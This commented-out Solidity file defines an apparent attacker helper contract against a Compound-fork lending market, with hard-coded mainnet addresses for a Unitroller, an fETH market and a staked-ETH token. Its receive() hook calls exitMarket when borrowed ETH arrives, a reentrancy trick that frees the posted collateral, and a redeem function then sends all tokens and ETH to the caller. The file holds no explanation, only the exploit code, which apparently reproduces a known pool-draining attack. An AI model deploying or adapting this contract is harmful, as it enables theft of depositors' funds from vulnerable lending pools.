// // SPDX-License-Identifier: Unlicense
// pragma solidity ^0.8.13;

// import "../HarvestFF/interfaces/IERC20.sol";
// import "./interfaces/CErc20Interface.sol";
// import "./interfaces/ComptrollerInterface.sol";


// interface IFToken {
//     function allowance(address owner, address spender) external view returns (uint256);
//     function approve(address spender, uint256 amount) external returns (bool);
//     function balanceOf(address owner) external view returns (uint256);
//     function mint(uint256 mintAmount) external returns (uint256);
//     function borrow(uint256 borrowAmount) external returns (uint256);
//     function redeemUnderlying(uint256 redeemAmount) external returns (uint256);
//     function getCash() external view returns (uint);
//     function totalBorrows() external view returns (uint256);
//     function totalReserves() external view returns (uint256);
// }

// contract Convert146 {
//     ComptrollerInterface private constant unitroller = ComptrollerInterface(0x88F7c23EA6C4C404dA463Bc9aE03b012B32DEf9e); // Unitroller
//     IERC20 private constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

//     // balancer protocol flash loan check
//     IERC20 private constant LIDO = IERC20(0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0);
    
//     // FxToken Address
//     // 0xe92a3db67e4b6AC86114149F522644b34264f858
//     address constant fETH = address(0xfbD8Aaf46Ab3C2732FA930e5B343cd67cEA5054C); //fETH156
//     address private fTokenCache;
//     uint256 private mintTokenCache;

//     constructor() {}

//     receive () external payable {
//         unitroller.exitMarket(fTokenCache);
//     }   

//     function _bootLoad(address fToken) external {
//         fTokenCache = fToken;
//         address[] memory em = new address[](1);
//         em[0] = fToken;
//         unitroller.enterMarkets(em);
//     }
//     function _cBorrow(uint cBorrow) external {
//         IFToken(fETH).borrow(cBorrow);
//     }

//     function _cMint() external {
//         LIDO.approve(fTokenCache, type(uint256).max);
//         uint _LIDOBalance = LIDO.balanceOf(address(this));
//         CErc20Interface(fTokenCache).mint(_LIDOBalance);
//         mintTokenCache = _LIDOBalance;
//     }


//     function _cRedeemAll() external {
//         CErc20Interface(fTokenCache).approve(fTokenCache, type(uint256).max);
//         CErc20Interface(fTokenCache).redeemUnderlying(mintTokenCache);

//         uint256 new_LIDOBalance = LIDO.balanceOf(address(this));
//         LIDO.transfer(msg.sender, new_LIDOBalance);
//         payable(msg.sender).transfer(address(this).balance);
//     }
// }
